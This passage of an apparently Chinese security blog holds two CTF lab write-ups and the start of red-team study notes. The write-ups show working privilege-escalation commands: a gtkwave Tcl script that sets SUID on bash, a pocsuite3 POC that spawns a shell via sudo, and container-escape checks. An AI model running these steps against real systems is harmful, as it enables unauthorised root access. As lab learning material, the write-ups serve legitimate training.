GtkPlug to connect to</span><br><span class="line">  -1, --rpcid=RPCID          specify RPCID of GConf session</span><br><span class="line">  -2, --chdir=DIR            specify new current working directory</span><br><span class="line">  -3, --restore              restore previous session</span><br><span class="line">  -4, --rcvar                specify single rc variable values individually</span><br><span class="line">  -5, --sstexclude           specify sst exclusion filter filename</span><br><span class="line">  -I, --interactive          interactive VCD mode (filename is shared mem ID)</span><br><span class="line">  -C, --comphier             use compressed hierarchy names (slower)</span><br><span class="line">  -g, --giga                 use gigabyte mempacking when recoding (slower)</span><br><span class="line">  -L, --legacy               use legacy VCD mode rather than the VCD recoder</span><br><span class="line">  -v, --vcd                  use stdin as a VCD dumpfile</span><br><span class="line">  -O, --output=FILE          specify filename for stdout/stderr redirect</span><br><span class="line">  -z, --slider-zoom          enable horizontal slider stretch zoom</span><br><span class="line">  -V, --version              display version banner then exit</span><br><span class="line">  -h, --help                 display this help then exit</span><br><span class="line">  -x, --exit                 exit after loading trace (for loader benchmarks)</span><br><span class="line"></span><br><span class="line">VCD files and save files may be compressed with zip or gzip.</span><br><span class="line">GHW files may be compressed with gzip or bzip2.</span><br><span class="line">Other formats must remain uncompressed due to their non-linear access.</span><br><span class="line">Note that DUMPFILE is optional if the --dump or --nocli options are specified.</span><br><span class="line">SAVEFILE and RCFILE are always optional.</span><br><span class="line"></span><br><span class="line">Report bugs to &lt;bybell@rocketmail.com&gt;.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-S, --script=FILE 和 -T, --tcl_init=FILE：指定 Tcl 脚本文件</span><br><span class="line"></span><br><span class="line">这是最直接的风险点。Tcl 是一种脚本语言，如果 gtkwave 允许通过这些参数加载并执行任意 Tcl 脚本文件，那么攻击者就可以创建一个 Tcl 脚本，在其中包含系统命令（例如 exec &quot;bash -i&quot;, system &quot;chmod 4755 /bin/sh&quot; 等）。</span><br><span class="line">由于 pycrtlake 可以 sudo gtkwave，这意味着这个 Tcl 脚本将以 root 权限执行，从而导致任意命令执行和直接提权。</span><br><span class="line">风险等级：高。这是此类漏洞的经典利用方式。</span><br></pre></td></tr></table></figure><p>我们先创建一个利用文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;exec chmod u+s /bin/bash&quot; &gt; /tmp/root_shell.tcl</span><br></pre></td></tr></table></figure><p>但是执行失败是因为没有图形界面</p><p>可以用 Xvfb创建一个虚拟显示设备</p><p>它可以创建一个虚拟的 X 服务器，从而在没有物理显示器或图形界面的系统上（比如服务器）运行图形应用程序。</p><p>启动 Xvfb</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xvfb :99 -screen 0 1024x768x24 &amp;</span><br></pre></td></tr></table></figure><p>在即将运行 <code>gtkwave</code> 的终端会话中，需要设置 <code>DISPLAY</code> 环境变量，指向刚刚启动的 <code>Xvfb</code> 实例。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export DISPLAY=:99</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pycrtlake@PyCrt:~$ echo &quot;exec chmod u+s /bin/bash&quot; &gt; /tmp/root_shell.tcl</span><br><span class="line">pycrtlake@PyCrt:~$ sudo /usr/bin/gtkwave -S /tmp/root_shell.tcl</span><br><span class="line"></span><br><span class="line">GTKWave Analyzer v3.3.118 (w)1999-2023 BSI</span><br><span class="line"></span><br><span class="line">GTKWAVE | Use the -h, --help command line flags to display help.</span><br><span class="line"></span><br><span class="line">(gtkwave:1304): dconf-WARNING **: 06:57:12.187: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)</span><br><span class="line">GTKWAVE | Executing Tcl script &#x27;/tmp/root_shell.tcl&#x27;</span><br><span class="line">^C</span><br><span class="line">pycrtlake@PyCrt:~$ ls -al /bin/bash</span><br><span class="line">-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash</span><br><span class="line">pycrtlake@PyCrt:~$ bash -p</span><br><span class="line">bash-5.0# whoami</span><br><span class="line">root</span><br><span class="line">bash-5.0# </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>box</title>
      <link href="/2025/05/29/box/"/>
      <url>/2025/05/29/box/</url>
      
        <content type="html"><![CDATA[<p>ysper牌靶机<a href="https://ysper.fun/index.php/2025/04/14/%E8%87%AA%E5%88%B6%E9%9D%B6%E6%9C%BA/">自制靶机 - Ysper_1</a></p><p>爆破邮箱密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423192608226.png" alt="image-20250423192608226"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423192548144.png" alt="image-20250423192548144"></p><p>爆破后在里面找到第一个flag</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423192718368.png" alt="image-20250423192718368"></p><p>然后利用爆出的密码1q2w3e4r</p><p>去进行smb faker访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载源码</span><br><span class="line">smb: \&gt; recurse ON</span><br><span class="line">smb: \&gt; prompt OFF</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure><p>源码中找到</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422204357143.png" alt="image-20250422204357143"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422204337146.png" alt="image-20250422204337146"></p><p>拿到shell</p><p>数据库中有flag</p><p>数据库密码为root在源码config文件中也可找到</p><p>sudo -l发现faker权限的pocsuite</p><p>提权到faker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; &#x27;EOF&#x27; &gt; /tmp/e.py</span><br><span class="line">from pocsuite3.api import Output, POCBase, register_poc</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class POC(POCBase):</span><br><span class="line">    vulID = &quot;faker-001&quot;  # 随便写一个ID</span><br><span class="line">    version = &quot;1.0&quot;</span><br><span class="line">    author = &quot;chatgpt&quot;</span><br><span class="line">    vulDate = &quot;2025-04-20&quot;</span><br><span class="line">    createDate = &quot;2025-04-20&quot;</span><br><span class="line">    updateDate = &quot;2025-04-20&quot;</span><br><span class="line">    references = []</span><br><span class="line">    name = &quot;faker privilege shell&quot;</span><br><span class="line">    appPowerLink = &quot;-&quot;</span><br><span class="line">    appName = &quot;faker&quot;</span><br><span class="line">    appVersion = &quot;1.0&quot;</span><br><span class="line">    vulType = &quot;privilege escalation&quot;</span><br><span class="line">    desc = &quot;spawn bash as faker user&quot;</span><br><span class="line">    </span><br><span class="line">    def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        os.system(&quot;/bin/bash&quot;)//做权限维持的话就在这里读私钥</span><br><span class="line">        return self.parse_output(Output(self))</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">register_poc(POC)</span><br><span class="line">EOF</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u faker /usr/local/bin/pocsuite -u 127.0.0.1  -r /tmp/e.py</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423143302149.png" alt="image-20250423143302149"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423155705198.png" alt="image-20250423155705198"></p><p>很明显8080</p><p>代理出来</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423155752101.png" alt="image-20250423155752101"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423155727590.png" alt="image-20250423155727590"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423155820519.png" alt="image-20250423155820519"></p><p>打PHP 8.1.0-dev rce</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423155645060.png" alt="image-20250423155645060"></p><p>然后就是简单是容器逃逸</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /var/run/docker.sock</span><br><span class="line">检查套接字</span><br><span class="line">capsh --print | grep cap_sys_admin</span><br><span class="line">是否为特权容器</span><br><span class="line">mount | grep -E &#x27; / | /host | /mnt&#x27;</span><br><span class="line">是否挂载了宿主文件系统</span><br><span class="line">ls -la /proc/1/root</span><br><span class="line">是否能访问 /proc/1/root</span><br><span class="line">uname -a</span><br><span class="line">查看内核版本</span><br></pre></td></tr></table></figure><p>最后可得</p><p>Privileged 特权模式逃逸</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529213042007.png" alt="image-20250529213042007"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红队学习笔记-one</title>
      <link href="/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/"/>
      <url>/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/</url>
      
        <content type="html"><![CDATA[<h2 id="红队基础知识"><a href="#红队基础知识" class="headerlink" title="红队基础知识"></a>红队基础知识</h2><h3 id="漏洞评估和渗透测试限制"><a href="#漏洞评估和渗透测试限制" class="headerlink" title="漏洞评估和渗透测试限制"></a>漏洞评估和渗透测试限制</h3><h4 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h4><p>这是最简单的安全评估形式，其主要目标是在网络中尽可能多的系统中识别尽可能多的漏洞。为此，可以做出让步以有效地实现这一目标。例如，攻击者的计算机可能在可用的安全解决方案中被列入允许列表，以避免干扰漏洞发现过程。这是有道理的，因为目标是查看网络上的每台主机并单独评估其安全状况，同时向公司提供关于修复工作重点的最多信息。</p><p>总而言之， 漏洞评估的重点是将主机作为单个实体进行漏洞扫描，以便<strong>识别</strong>安全缺陷并部署有效的安全措施，以优先<strong>方式保护</strong>网络。大部分工作可以使用自动化工具完成，并由作员执行，不需要太多的技术知识。</p><p>例如，如果要通过网络运行漏洞评估 ，通常会尝试扫描尽可能多的主机，但实际上根本不会尝试利用任何漏洞：</p><h4 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h4><p>除了扫描每台主机的漏洞之外，我们通常还需要了解它们如何影响我们的整个网络。渗透测试允许渗透测试人员通过执行其他步骤来探索攻击者对整个网络的影响，从而增加漏洞评估，这些步骤包括：</p><ul><li>尝试<strong>利用</strong>在每个系统上发现的漏洞。这一点很重要，因为有时系统中可能存在漏洞，但适当的补偿控制可以有效地防止其被利用。它还允许我们测试是否可以使用检测到的漏洞来破坏给定的主机。</li><li>在任何受感染的主机上执行<strong>利用后</strong>任务，使我们能够发现是否可以从中提取任何有用的信息，或者我们是否可以使用它们来转向以前无法从我们所在的位置访问的其他主机。</li></ul><p>渗透测试可能从扫描漏洞开始，就像常规漏洞评估一样，但会提供有关攻击者如何链接漏洞以实现特定目标的更多信息。虽然它的重点仍然是<strong>识别</strong>漏洞和建立<strong>保护</strong>网络的措施，但它也将网络视为一个完整的生态系统，以及攻击者如何从其组件之间的交互中获利。</p><p>如果我们要使用与之前相同的示例网络执行渗透测试，除了扫描网络上的所有主机以查找漏洞之外，我们还会尝试确认它们是否可以被利用，以显示攻击者可能对网络产生的影响：</p><p>通过分析攻击者如何在我们的网络中移动，我们还可以对可能的安全措施绕过方式以及在一定程度上检测真实威胁行为者的能力获得基本的见解。不过，这种能力是有限的，因为渗透测试的范围通常很广，而且渗透测试人员并不太在意是否会触发大量安全设备的警报，因为此类项目通常受到时间限制，要求我们在短时间内对网络进行测试。</p><h4 id="高级持续性威胁（APT）及为何常规渗透测试不足以应对"><a href="#高级持续性威胁（APT）及为何常规渗透测试不足以应对" class="headerlink" title="高级持续性威胁（APT）及为何常规渗透测试不足以应对"></a><strong>高级持续性威胁（APT）及为何常规渗透测试不足以应对</strong></h4><p><strong>传统的安全测试（如渗透测试）可以发现大多数技术漏洞，但它们在应对真实攻击者时存在一定的局限性</strong>。</p><p><img src="/../imgs/$%7Bfiilename%7D/f9c16ff60c1412eefd77f12253643bab.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;f9c16ff60c1412eefd77f12253643bab.png"></p><p><strong>Time Constraints（时间限制）</strong> ⏰</p><ul><li>传统安全评估（如渗透测试）通常是在<strong>短时间内进行的</strong>，测试人员无法像真实攻击者一样长时间潜伏、研究目标，导致许多隐蔽性强的攻击手法无法被发现。</li></ul><p><strong>Budget（预算）</strong> 💰</p><ul><li>许多企业在安全预算上有限，可能<strong>无法进行全面的安全评估</strong>，尤其是涉及深度模拟真实攻击（如红队演练）的测试成本较高。</li></ul><p><strong>Limited Scope（范围有限）</strong> 🎯</p><ul><li>渗透测试通常有<strong>明确的范围</strong>，测试人员只能在<strong>规定的系统、IP 段或应用程序</strong>内进行测试，而真实攻击者没有这样的限制，他们可能会利用供应链攻击、社会工程学等手段。</li></ul><p><strong>Non-disruptive（非破坏性）</strong> 🔥</p><ul><li>传统安全评估通常要求<strong>不会影响业务运营</strong>，因此不会进行一些高风险的测试（如持久化攻击、破坏性利用），而真实攻击者不会有这种顾虑，他们的目标是<strong>长期潜伏、完全控制系统</strong>。</li></ul><p><strong>Heavy IT Focus（过于关注 IT 层面）</strong> 🌍💻</p><ul><li>传统安全测试<strong>主要关注 IT 设备、服务器和软件漏洞</strong>，但真正的攻击可能涉及<strong>物理安全、社会工程学、供应链攻击等非技术手段</strong>，而这些往往超出了渗透测试的范围。</li></ul><hr><h5 id="渗透测试-vs-真实攻击的关键区别"><a href="#渗透测试-vs-真实攻击的关键区别" class="headerlink" title="渗透测试 vs. 真实攻击的关键区别"></a>渗透测试 vs. 真实攻击的关键区别</h5><h6 id="1-渗透测试的局限性"><a href="#1-渗透测试的局限性" class="headerlink" title="(1) 渗透测试的局限性"></a>(1) 渗透测试的局限性</h6><ol><li><strong>渗透测试是“吵闹的”（LOUD）</strong> 🔊<ul><li>渗透测试人员通常不会刻意保持隐蔽，而是尽可能<strong>快速发现漏洞</strong>。</li><li>他们不怕被检测到，因为他们的目的是<strong>尽快找出所有可能的安全问题</strong>，而不是真正模拟攻击者的隐秘行动。</li><li>但<strong>真实的攻击者会极力隐藏行踪</strong>，利用“低慢攻击（Low &amp; Slow Attacks）”来绕过安全监测。</li></ul></li><li><strong>非技术攻击（如社工攻击、物理入侵）可能被忽视</strong> 🎭<ul><li>渗透测试一般<strong>只关注技术层面</strong>，例如漏洞利用、权限提升等。</li><li>但<strong>真正的攻击者可能会利用社会工程学（如钓鱼邮件）或物理入侵（如尾随进入机房）来获取访问权限</strong>。</li><li>这意味着，<strong>即使技术安全措施很完善，企业仍可能因人为因素而被攻击</strong>。</li></ul></li><li><strong>安全机制可能被临时放宽</strong> 🛑<ul><li>为了提高渗透测试的效率，企业可能会<strong>暂时禁用 IDS&#x2F;IPS（入侵检测&#x2F;防御系统）、WAF（Web 应用防火墙）等安全措施</strong>。</li><li>这有助于测试人员专注于查找系统漏洞，而不是花时间绕过安全防御。</li><li>但<strong>真实攻击者不会遇到这些“特权”</strong>，他们必须想办法真正绕过这些安全机制。</li><li>这使得渗透测试<strong>无法真实反映攻击者如何突破企业防御</strong>。</li></ul></li></ol><hr><h6 id="2-真实攻击者（尤其是APT）的特点"><a href="#2-真实攻击者（尤其是APT）的特点" class="headerlink" title="(2) 真实攻击者（尤其是APT）的特点"></a><strong>(2) 真实攻击者（尤其是APT）的特点</strong></h6><ol><li><strong>不受道德或规则约束</strong> ❌<ul><li>渗透测试人员有<strong>道德和法律约束</strong>，必须遵守测试范围，而真正的攻击者<strong>可以采用任何手段</strong>。</li><li>例如，APT 可能使用<strong>零日漏洞、社工攻击、长时间潜伏</strong>等方式，而这些往往不在普通渗透测试的范围内。</li></ul></li><li><strong>高级持续性威胁（APT）是现代最大威胁之一</strong> ⚠️<ul><li>APT（Advanced Persistent Threats，高级持续性威胁）通常由<strong>国家级黑客组织或有组织犯罪团伙</strong>支持，目标通常是<strong>关键基础设施、金融机构、政府机构</strong>。</li><li>他们的攻击手法包括：<ul><li>通过<strong>钓鱼邮件</strong>获取初始访问权限。</li><li><strong>利用零日漏洞</strong>绕过安全机制。</li><li><strong>长期潜伏</strong>在受害网络中，隐秘地进行数据窃取或控制系统。</li></ul></li><li><strong>这些攻击可能持续数月甚至数年，传统渗透测试难以模拟这种攻击方式</strong>。</li></ul></li></ol><hr><h6 id="2-APT-相关的现实问题"><a href="#2-APT-相关的现实问题" class="headerlink" title="2. APT 相关的现实问题"></a><strong>2. APT 相关的现实问题</strong></h6><p>企业面对 APT 可能面临以下挑战：</p><ul><li><strong>如果APT已经潜伏了几个月，企业能检测到吗？</strong></li><li><strong>如果攻击者利用了社工攻击（如员工误点恶意邮件），企业能阻止吗？</strong></li><li><strong>如果APT利用的是零日漏洞（Zero-Day），企业的安全策略是否足够？</strong></li><li><strong>传统的渗透测试能帮助企业应对这些挑战吗？</strong></li></ul><p>这些问题表明，<strong>传统渗透测试可能不足以真正模拟 APT 攻击</strong>，因此需要更高级的安全评估方法。</p><hr><h6 id="3-解决方案：红队演练（Red-Team-Engagements）"><a href="#3-解决方案：红队演练（Red-Team-Engagements）" class="headerlink" title="3. 解决方案：红队演练（Red Team Engagements）"></a>3. 解决方案：红队演练（Red Team Engagements）</h6><p><strong>红队演练（Red Team Engagements）</strong> 是为了更真实地模拟攻击者的行为，<strong>弥补渗透测试的不足</strong>，主要特点包括：</p><ul><li><strong>隐蔽性强</strong>：红队会像真实攻击者一样，尝试<strong>长时间不被发现</strong>。</li><li><strong>使用各种攻击手法</strong>：包括技术漏洞利用、社工攻击、供应链攻击等。</li><li><strong>目标明确</strong>：通常是<strong>长期潜伏、控制关键系统或获取敏感数据</strong>，而不是单纯查找漏洞。</li><li><strong>不受安全机制放宽的影响</strong>：企业不会关闭安全机制，红队必须真正绕过它们。</li></ul><hr><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h6><table><thead><tr><th>对比项</th><th>传统渗透测试（Pentesting）</th><th>真实攻击（APT）</th><th>红队演练（Red Team）</th></tr></thead><tbody><tr><td><strong>隐蔽性</strong></td><td>很“吵闹”，容易被检测</td><td>极度隐蔽，长期潜伏</td><td>尽可能模拟APT，保持隐蔽</td></tr><tr><td><strong>攻击方式</strong></td><td>主要是技术漏洞</td><td>可能涉及社工、物理攻击</td><td>结合技术+社工+物理</td></tr><tr><td><strong>安全机制</strong></td><td>可能被临时放宽</td><td>必须绕过真实防御</td><td>必须绕过真实防御</td></tr><tr><td><strong>目标</strong></td><td>发现尽可能多的漏洞</td><td>获取长期访问控制</td><td>真实模拟攻击者目标</td></tr><tr><td><strong>限制</strong></td><td>受道德、法律和测试范围约束</td><td>没有限制</td><td>受企业授权范围约束，但比渗透测试更接近真实攻击</td></tr></tbody></table><p>** 结论: **</p><ul><li>传统渗透测试<strong>适用于发现漏洞</strong>，但无法模拟真正的APT攻击。</li><li><strong>红队演练是更高级的安全评估方法，可以更真实地检测企业的安全防御能力</strong>。</li><li>现代企业要提升安全性，<strong>不能仅依赖渗透测试，而需要结合红队演练、威胁狩猎（Threat Hunting）等方式</strong>。</li></ul><h3 id="红队演练"><a href="#红队演练" class="headerlink" title="红队演练"></a>红队演练</h3><h4 id="红队演练的演变及其与传统渗透测试的区别"><a href="#红队演练的演变及其与传统渗透测试的区别" class="headerlink" title="红队演练的演变及其与传统渗透测试的区别"></a><strong>红队演练的演变及其与传统渗透测试的区别</strong></h4><h5 id="1-红队演练的核心目标"><a href="#1-红队演练的核心目标" class="headerlink" title="1. 红队演练的核心目标"></a><strong>1. 红队演练的核心目标</strong></h5><p>为了应对不断变化的网络安全威胁，<strong>红队演练（Red Team Engagements）</strong> 诞生，其目的是<strong>从传统渗透测试（Penetration Testing）转向更关注检测和响应能力的安全评估</strong>。</p><ul><li><strong>传统渗透测试</strong> 主要关注<strong>发现漏洞</strong>，帮助组织修复安全缺陷。</li><li><strong>红队演练</strong> 则着重于<strong>检测（Detection）与响应（Response）</strong>，评估防御团队（蓝队）的实际应对能力。</li><li><strong>两者是互补关系，而非替代关系</strong>。</li></ul><hr><h5 id="2-红队概念的军事来源"><a href="#2-红队概念的军事来源" class="headerlink" title="2. 红队概念的军事来源"></a><strong>2. 红队概念的军事来源</strong></h5><p>“红队（Red Team）” 一词最早来源于<strong>军事演习</strong>，在军事背景下，</p><ul><li>“红队” 扮演攻击方，模拟真实的敌对势力，测试防御方的应对能力。</li><li>“蓝队（Blue Team）” 作为防御方，负责侦测、分析并阻止攻击行为。</li></ul><p>在<strong>网络安全领域</strong>，这一概念被引入，红队演练通过模拟真实黑客的<strong>战术、技术和程序（TTPs - Tactics, Techniques, and Procedures）</strong>，来评估<strong>蓝队的防御能力，并改进安全控制措施</strong>。</p><hr><h5 id="3-红队演练的流程"><a href="#3-红队演练的流程" class="headerlink" title="3. 红队演练的流程"></a><strong>3. 红队演练的流程</strong></h5><p>每次红队演练都会<strong>定义明确的目标</strong>（常被称为“<strong>王冠上的明珠（Crown Jewels）</strong>”或“<strong>旗帜（Flags）</strong>”），目标通常包括：</p><ul><li><strong>攻破某个关键服务器</strong>（如内网服务器、核心数据库）。</li><li><strong>窃取敏感数据</strong>（如财务记录、客户信息、员工凭据）。</li><li><strong>控制某个关键业务流程</strong>（如修改交易记录、劫持邮件系统）。</li></ul><p>🔹 <strong>与传统渗透测试不同</strong>：<br> 在红队演练中，<strong>蓝队（防御团队）通常不会被提前告知</strong>，以<strong>避免人为干预</strong>，确保防御能力的真实评估。</p><ul><li>红队需要<strong>尽可能隐蔽</strong>地执行攻击，不留下明显的痕迹。</li><li><strong>不需要扫描整个网络</strong>，而是寻找<strong>一条最有效的攻击路径</strong>，像真实的黑客一样，利用最少的攻击面实现目标。</li><li>他们必须绕过 <strong>防火墙、杀毒软件（AV）、终端检测与响应（EDR）、入侵防御系统（IPS）等安全机制</strong>。</li></ul><hr><h5 id="4-真实案例：目标是入侵内网服务器"><a href="#4-真实案例：目标是入侵内网服务器" class="headerlink" title="4. 真实案例：目标是入侵内网服务器"></a><strong>4. 真实案例：目标是入侵内网服务器</strong></h5><p>假设红队的目标是<strong>入侵企业内部的 Intranet 服务器</strong>，攻击流程可能如下：</p><p>1️⃣ <strong>获取初始访问权限</strong>：</p><ul><li>可能使用<strong>钓鱼邮件</strong>（Phishing）诱骗员工执行恶意代码。</li><li>也可能利用外部暴露的<strong>Web 应用漏洞</strong>（如 SQL 注入、远程代码执行）。</li></ul><p>2️⃣ <strong>权限提升 &amp; 横向移动</strong>：</p><ul><li>利用<strong>凭据窃取技术</strong>（如 Mimikatz）获取更高权限。</li><li>通过 SMB、RDP、PsExec 在网络内扩展。</li></ul><p>3️⃣ <strong>隐蔽渗透 &amp; 规避检测</strong>：</p><ul><li>使用 C2（Command &amp; Control）服务器保持远程访问。</li><li>规避 EDR、SIEM 等安全监测工具。</li></ul><p>4️⃣ <strong>达成目标 &amp; 数据外泄</strong>：</p><ul><li>窃取数据库中的<strong>客户数据</strong>或<strong>财务信息</strong>。</li><li>控制核心业务流程，如篡改企业邮件系统。</li></ul><p>5️⃣ <strong>清理痕迹 &amp; 反馈报告</strong>：</p><ul><li>删除日志、清除恶意文件，确保攻击难以被溯源。</li><li><strong>最终，红队会向企业提供详细的安全评估报告，以帮助蓝队提升防御能力。</strong></li></ul><hr><h5 id="5-关键点总结"><a href="#5-关键点总结" class="headerlink" title="5. 关键点总结"></a><strong>5. 关键点总结</strong></h5><p>✅ <strong>红队演练不是简单的漏洞扫描，而是全面测试安全体系的“实战能力”</strong>。<br> ✅ <strong>目标是提高检测和响应能力，而非仅仅发现漏洞</strong>。<br> ✅ <strong>模拟 APT（高级持续性威胁）黑客行为，长期潜伏、低调行动，绕过安全防御</strong>。<br> ✅ <strong>蓝队通常不会提前知情，以保证测试的真实性</strong>。<br> ✅ <strong>红队成功的关键在于隐蔽行动，找到最短路径完成目标，而非大范围扫描漏洞</strong>。</p><p>通过红队演练，企业可以有效衡量自身的安全防御能力，并不断优化安全策略，以应对真正的网络攻击威胁。</p><h4 id="红队演练的最终目标及不同方式"><a href="#红队演练的最终目标及不同方式" class="headerlink" title="红队演练的最终目标及不同方式"></a><strong>红队演练的最终目标及不同方式</strong></h4><h5 id="1-红队的最终目标：提升蓝队的检测与响应能力"><a href="#1-红队的最终目标：提升蓝队的检测与响应能力" class="headerlink" title="1. 红队的最终目标：提升蓝队的检测与响应能力"></a><strong>1. 红队的最终目标：提升蓝队的检测与响应能力</strong></h5><p>红队演练的<strong>最终目的</strong>，<strong>绝不是“打败”蓝队</strong>，而是通过模拟真实攻击者的<strong>战术、技术与程序（TTPs）</strong>，</p><ul><li><strong>帮助蓝队提高检测和响应能力</strong>，增强组织面对真实攻击时的安全防御能力。</li><li><strong>优化现有的安全机制</strong>，如果必要，调整或增加新的安全控制措施，以提高对威胁的检测能力。</li></ul><hr><h5 id="2-红队相比渗透测试的进阶提升"><a href="#2-红队相比渗透测试的进阶提升" class="headerlink" title="2. 红队相比渗透测试的进阶提升"></a><strong>2. 红队相比渗透测试的进阶提升</strong></h5><p>红队演练相比<strong>传统渗透测试</strong>，在**攻击面（Attack Surfaces）**的考虑上更加全面，涵盖多个维度：</p><p>✅ <strong>技术基础设施（Technical Infrastructure）</strong></p><ul><li>这一部分与传统渗透测试类似，仍然会<strong>寻找系统和网络中的技术漏洞</strong>。</li><li>但相比之下，<strong>红队更强调隐蔽性和规避检测</strong>，模拟高级攻击者的低调行动。</li></ul><p>✅ <strong>社会工程学（Social Engineering）</strong></p><ul><li>通过 <strong>钓鱼邮件（Phishing）、电话社交工程（Vishing）、社交媒体诱导</strong> 等方式，</li><li>诱骗目标泄露敏感信息（如登录凭据、内部文件）。</li><li>这类攻击方式在真实攻击场景中极为常见，APT 组织尤其擅长利用社会工程学手段。</li></ul><p>✅ <strong>物理入侵（Physical Intrusion）</strong></p><ul><li><strong>锁具破解（Lockpicking）</strong>：利用开锁工具突破物理门禁。</li><li><strong>RFID 克隆</strong>：拷贝门禁卡权限，进入机房等受限区域。</li><li><strong>电子访问控制漏洞</strong>：绕过电子门禁系统（如磁卡、指纹识别等）。</li></ul><hr><h5 id="3-红队演练的不同执行方式"><a href="#3-红队演练的不同执行方式" class="headerlink" title="3. 红队演练的不同执行方式"></a><strong>3. 红队演练的不同执行方式</strong></h5><p>红队演练可以根据<strong>组织的资源和需求</strong>，选择不同的执行方式：</p><p>🔴 <strong>全面演练（Full Engagement）</strong></p><ul><li>这是最完整的攻击模拟，<strong>从初始渗透到最终目标的达成</strong>，完全模拟攻击者的完整工作流程。</li><li>适用于<strong>需要全方位测试安全体系</strong>的组织。</li></ul><p>🔴 <strong>假设入侵（Assumed Breach）</strong></p><ul><li>直接假设攻击者已经突破了某些安全防线，<strong>跳过初始渗透阶段</strong>。</li><li>例如，红队可能直接获得<strong>员工的凭据</strong>或<strong>内网某台工作站的访问权限</strong>，然后评估能否进一步扩展权限、获取敏感数据等。</li><li>这种方式主要用于<strong>评估企业内部的检测和响应能力</strong>，特别是<strong>内网安全策略</strong>。</li></ul><p>🔴 <strong>桌面推演（Table-top Exercise）</strong></p><ul><li>采用<strong>模拟讨论的方式</strong>，由红队和蓝队在会议室<strong>探讨不同威胁场景</strong>，并评估如何应对。</li><li>适用于<strong>无法进行实战演练</strong>的情况，如高度敏感的生产环境或<strong>资源受限</strong>的企业。</li></ul><hr><h4 id="4-关键点总结"><a href="#4-关键点总结" class="headerlink" title="4. 关键点总结"></a><strong>4. 关键点总结</strong></h4><p>✅ <strong>红队的目标不是打败蓝队，而是帮助其提升检测和响应能力。</strong><br> ✅ <strong>红队比渗透测试更全面，涵盖技术漏洞、社会工程、物理安全等多个攻击面。</strong><br> ✅ <strong>红队演练方式多样，可根据资源选择全面演练、假设入侵或桌面推演。</strong><br> ✅ <strong>最终目的是提高企业整体安全防御水平，使其能有效应对真实的网络攻击。</strong></p><h3 id="交战结构"><a href="#交战结构" class="headerlink" title="交战结构"></a>交战结构</h3><h4 id="红队的核心职能：对抗模拟"><a href="#红队的核心职能：对抗模拟" class="headerlink" title="红队的核心职能：对抗模拟"></a><strong>红队的核心职能：对抗模拟</strong></h4><h5 id="1-红队的对抗模拟（Adversary-Emulation）"><a href="#1-红队的对抗模拟（Adversary-Emulation）" class="headerlink" title="1. 红队的对抗模拟（Adversary Emulation）"></a><strong>1. 红队的对抗模拟（Adversary Emulation）</strong></h5><p>红队的核心职能之一是<strong>模拟真实的攻击者</strong>。虽然不是强制要求，但通常会使用<strong>真实攻击者的工具和方法</strong>，</p><ul><li><strong>评估企业在面对真实威胁时的防御能力</strong>。</li><li><strong>利用不同的“网络攻击链（Cyber Kill Chains）”来总结和评估攻击步骤和战术流程</strong>。</li></ul><blockquote><p><strong>攻击链（Kill Chain）</strong>：是指攻击者在进行网络攻击时的<strong>一系列步骤</strong>，用于描述从最初的侦察到最终攻击目标达成的全过程。</p></blockquote><p><strong>蓝队</strong>（防御团队）通常利用<strong>攻击链模型</strong>来分析攻击者的行为，并找到阻断攻击的关键点。<br> <strong>红队</strong>可以采用同样的方法，把**真实攻击者的战术、技术和程序（TTPs）**映射到演练过程，评估攻击流程的有效性。</p><hr><h5 id="2-常见的网络攻击链模型"><a href="#2-常见的网络攻击链模型" class="headerlink" title="2. 常见的网络攻击链模型"></a><strong>2. 常见的网络攻击链模型</strong></h5><p>许多安全法规和标准组织都提出了自己的<strong>网络攻击链</strong>模型，不同模型的结构大致相同，但详细程度和目标设定有所不同。<br> 以下是几个<strong>常见的网络攻击链模型</strong>：</p><p>1️⃣ <strong>Lockheed 